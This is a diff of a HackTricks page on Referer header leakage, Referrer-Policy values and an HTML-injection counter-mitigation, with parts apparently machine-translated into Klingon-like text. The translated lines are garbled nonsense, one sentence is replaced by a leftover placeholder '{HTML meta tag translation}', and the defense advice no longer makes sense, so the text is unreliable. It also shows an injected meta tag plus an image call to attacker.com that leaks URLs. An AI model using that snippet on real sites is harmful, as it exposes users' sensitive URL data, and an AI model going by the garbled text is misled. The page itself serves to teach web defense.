@@ -1,8 +1,6 @@
-
-
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>qaStaHvIS AWS hacking vItlh zero to hero</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Other ways to support HackTricks:
 
@@ -17,7 +15,7 @@ Other ways to support HackTricks:
 
 # Referrer headers and policy
 
-Referrer is the header used by browsers to indicate which was the previous page visited.
+Referrer vItlh browsers lo'laH previous page visited jImej.
 
 ## Sensitive information leaked
 
@@ -26,7 +24,6 @@ If at some point inside a web page any sensitive information is located on a GET
 ## Mitigation
 
 You can make the browser follow a **Referrer-policy** that could **avoid** the sensitive information to be sent to other web applications:
-
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -37,19 +34,16 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
-
 ## Counter-Mitigation
 
-You can override this rule using an HTML meta tag (the attacker needs to exploit and HTML injection):
-
+{HTML meta tag translation} (HTML injection attack vItlhutlh):
 ```markup
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
+## QeH
 
-## Defense
-
-Never put any sensitive data inside GET parameters or paths in the URL.
+jImej GET parameters qojDaq pagh URL Daq vItlhutlh.
 
 
 <details>
@@ -65,5 +59,3 @@ Other ways to support HackTricks:
 * **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
-
-
